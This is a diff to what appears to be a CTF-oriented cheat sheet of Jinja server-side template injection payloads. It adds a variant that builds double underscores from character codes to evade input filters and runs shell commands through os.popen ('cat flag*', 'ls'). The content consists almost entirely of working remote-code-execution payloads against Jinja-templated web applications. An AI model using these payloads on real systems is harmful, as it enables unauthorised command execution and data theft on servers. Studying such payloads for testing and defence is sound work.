@@ -7,6 +7,12 @@
 #### Jinja payload <i>(Python)</i> : 
 
 ```py
+ #normal payload
  {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
+
+ #payload without '_' and without '\' 
+{% set c='%c%c'|format(95,95) %}  {{ dict.mro()[-1] | attr(c~'subclasses'~c)() | attr(c~'getitem'~c)(183) |attr(c~'init'~c) | attr(c~'globals'~c) | attr(c~'getitem'~c)('sys') | attr('modules') | attr(c~'getitem'~c)('os') | attr('popen')('cat flag*') | attr('read')() }}
+
+ #not sure if it works but i found this.
  {{ url_for.__globals__.os.popen("ls").read() }}
  ```
